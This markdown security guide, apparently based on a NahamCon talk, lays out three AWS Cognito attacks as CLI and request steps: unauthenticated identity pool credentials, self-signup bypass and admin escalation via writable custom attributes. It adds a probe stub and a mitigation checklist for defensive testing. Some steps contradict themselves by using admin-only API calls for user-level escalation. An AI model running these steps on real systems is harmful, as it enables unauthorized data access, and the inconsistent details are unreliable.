# AWS Cognito Escalation Patterns: Three Production-Ready Attacks

From NahamConEU2022 by Yassine Aboukir. Real-world Cognito misconfigurations found in ~15-20% of applications using AWS Cognito.

---

## Pattern 1: Unauthorized Access via Liberal Identity Pool Credentials

**What it does:** Extract Identity Pool ID from app JS, fetch unauthenticated temporary AWS credentials, enumerate IAM permissions, access AWS services directly.

**Why it works:** Identity Pools can allow unauthenticated access if misconfigured. Credentials aren't sensitive alone but lead to lateral movement.

### Detection

Search Burp history or bundled JS for:
- `aws_cognito_identity_pool_id`
- `identityPoolId`
- `cognitoIdentityPoolId`
- `userPoolWebClientId`
- `userPoolId`
- `aws_user_pools_id`

These hardcoded IDs are NOT considered sensitive on their own.

### Exploitation Steps

1. **Extract Identity Pool ID** from JS bundle or HTTP response
2. **Find Region** (usually hardcoded nearby, e.g., `us-west-2`)
3. **Get Identity ID** via AWS CLI:
   ```bash
   aws cognito-identity get-id \
     --identity-pool-id <identity-pool-id> \
     --region <region>
   ```
4. **Fetch temporary credentials** using Identity ID:
   ```bash
   aws cognito-identity get-credentials-for-identity \
     --identity-id <identity-id> \
     --region <region>
   ```
5. **Enumerate IAM permissions** using fetched credentials:
   ```bash
   ./enumerate-iam.py --access-key <AccessKeyId> \
     --secret-key <SecretKey> \
     --session-token <SessionToken>
   ```
   Or use ScoutSuite.

6. **Access AWS services** based on enumerated permissions:
   - `dynamodb.list_backups()` → database backups
   - `dynamodb.list_tables()` → enumerate data
   - `lambda.list_functions()` → find functions
   - `s3.list_buckets()` → enumerate storage
   - `sts.get_caller_identity()` → check assumed role permissions

### Real Impact

- Read sensitive data from DynamoDB (user data, API keys, PII)
- Access Lambda function code (exfiltrate secrets from env vars)
- List S3 buckets and download objects
- Escalate to assumed role with higher permissions

### Severity

**CRITICAL** if unauthenticated access enabled + identity pool has broad permissions.

---

## Pattern 2: Authentication Bypass via Enabled Signup API

**What it does:** Self-registration enabled on Cognito user pools designed for admin-only provisioning. Create arbitrary accounts, obtain temporary AWS credentials via Identity Pool.

**Why it works:** Signup API enabled by default when creating user pools. Many apps forget to disable it for admin-only scenarios.

### Detection

Burp history keywords (from presentation):
- `aws_cognito_identity_pool_id`
- Search for API calls to `cognito-idp.*amazonaws.com`

Look for:
```
POST /api/v1/auth/signup  (or similar app endpoint)
OR direct Cognito API: AWSCognitoIdentityProviderService.SignUp
```

### Exploitation Steps

1. **Check if signup is enabled** (app may not expose UI for registration):
   ```bash
   aws cognito-idp sign-up \
     --client-id <client-id> \
     --username <email-address> \
     --password <password> \
     --region <region>
   ```

2. **Successful signup** returns CodeDeliveryDetailsList with email confirmation delivery:
   ```json
   {
     "CodeDeliveryDetailsList": [{
       "Destination": "y***@gmail.com",
       "DeliveryMedium": "EMAIL",
       "AttributeName": "email"
     }]
   }
   ```

3. **Confirmation code** is delivered to your email (if you control it) or via predictable patterns.

4. **Confirm signup**:
   ```bash
   aws cognito-idp confirm-sign-up \
     --client-id <client-id> \
     --username <email> \
     --confirmation-code <code> \
     --region <region>
   ```

5. **Escalate to AWS credentials** (see Pattern 1). Even without explicit user group assignment, you can access Identity Pool credentials if unauthenticated access enabled.

### Real Impact

- Create arbitrary accounts on admin-only app
- Bypass access controls intended for administrators
- Obtain AWS credentials for lateral movement
- Account takeover if you control email domain

### Severity

**CRITICAL** for admin portals / internal systems.
**HIGH** for general applications.

---

## Pattern 3: Privilege Escalation via Writable Custom Attributes

**What it does:** Update custom user attributes marked as writable by default (custom:role, custom:isAdmin, custom:userRole, custom:accessLevel). Escalate to admin without re-authentication.

**Why it works:** Custom attributes are writable by default unless explicitly set to read-only. Developers often trust custom attributes without verifying authorization on each access.

### Detection

1. **Extract Cognito configuration** from app:
   - Look for User Pool ID, Client ID in JS
   - Search API responses for custom attribute hints

2. **Fetch user attributes** (after authentication):
   ```bash
   aws cognito-idp get-user \
     --region <region> \
     --access-token <access-token>
   ```

   Look for custom attributes like:
   - `custom:isAdmin`
   - `custom:userRole`
   - `custom:isActive`
   - `custom:isApproved`
   - `custom:accessLevel`

3. **Check if writable** via AWS console or API:
   - If custom attribute is marked **Mutable**, it's writable
   - Users can update their own attributes (AdminUpdateUserAttributes not required)

### Exploitation Steps

1. **Identify writable custom attributes** from get-user response:
   ```json
   {
     "UserAttributes": [
       {
         "Name": "email",
         "Value": "attacker@gmail.com"
       },
       {
         "Name": "custom:userRole",
         "Value": "user"
       }
     ]
   }
   ```

2. **Update custom attribute** via admin API (if you have credentials) or direct app API:
   ```bash
   aws cognito-idp admin-update-user-attributes \
     --user-pool-id <user-pool-id> \
     --username <email> \
     --user-attributes Name=custom:userRole,Value=admin \
     --region <region>
   ```

3. **OR update via app's update profile endpoint** (may expose the attribute):
   ```bash
   PUT /api/profile
   {
     "email": "attacker@gmail.com",
     "custom:userRole": "admin"
   }
   ```

4. **Get new tokens** or wait for token refresh:
   ```bash
   aws cognito-idp admin-initiate-auth \
     --user-pool-id <user-pool-id> \
     --client-id <client-id> \
     --auth-flow ADMIN_NO_SRP_AUTH \
     --auth-parameters USERNAME=<email>,PASSWORD=<password> \
     --region <region>
   ```

5. **Decode new ID token** (JWT) to verify custom attribute escalation:
   ```bash
   jwt decode <id-token>  # Check custom:userRole claim
   ```

6. **Test admin access** — should now pass authorization checks trusting `custom:userRole=admin`.

### Real Impact

- Escalate from user → admin
- Access admin dashboards, settings, billing
- Modify other users' data
- Access restricted API endpoints
- Potential data exfiltration

### Severity

**CRITICAL** — Direct privilege escalation.

---

## Gauntlet Probe Integration

```python
class CognitoEscalationProbe(Probe):
    """Test all three Cognito escalation patterns."""
    
    bom = ['cognito-escalation']
    
    def _execute_attempt(self, attempt, seq):
        target = attempt.prompt.target_url
        findings = []
        
        # Pattern 1: Liberal Identity Pool credentials
        identity_pool = self._find_identity_pool(target)
        if identity_pool:
            findings.extend(self._test_unauthenticated_access(identity_pool))
        
        # Pattern 2: Signup API bypass
        client_id = self._find_cognito_client(target)
        region = self._find_region(target)
        if client_id and region:
            findings.extend(self._test_signup_bypass(client_id, region))
        
        # Pattern 3: Writable custom attributes
        if attempt.prompt.bearer_token:
            findings.extend(self._test_custom_attribute_escalation(
                attempt.prompt.bearer_token, target
            ))
        
        if findings:
            attempt.metrics['vulnerable'] = True
            attempt.metrics['findings'] = findings
            attempt.metrics['severity'] = 'CRITICAL'
        
        return attempt
```

---

## Mitigation Checklist

- [ ] Disable unauthenticated access on Identity Pools (or limit to public read-only data)
- [ ] Disable Signup API if app is admin-only provisioned
- [ ] Mark all privilege-bearing custom attributes as read-only
- [ ] Validate custom attributes server-side on every access (don't trust JWT claims alone)
- [ ] Use IAM roles with least-privilege instead of broad Cognito permissions
- [ ] Monitor for suspicious signup / attribute update events
- [ ] Rotate temporary credentials frequently

---

## References

- NahamConEU2022: "Hunting For AWS Cognito Security Misconfigurations" by Yassine Aboukir
- AWS Cognito Security Best Practices: https://docs.aws.amazon.com/cognito/latest/developerguide/
- enumerate-iam: https://github.com/andresriancho/enumerate-iam
- ScoutSuite: https://github.com/nccgroup/ScoutSuite
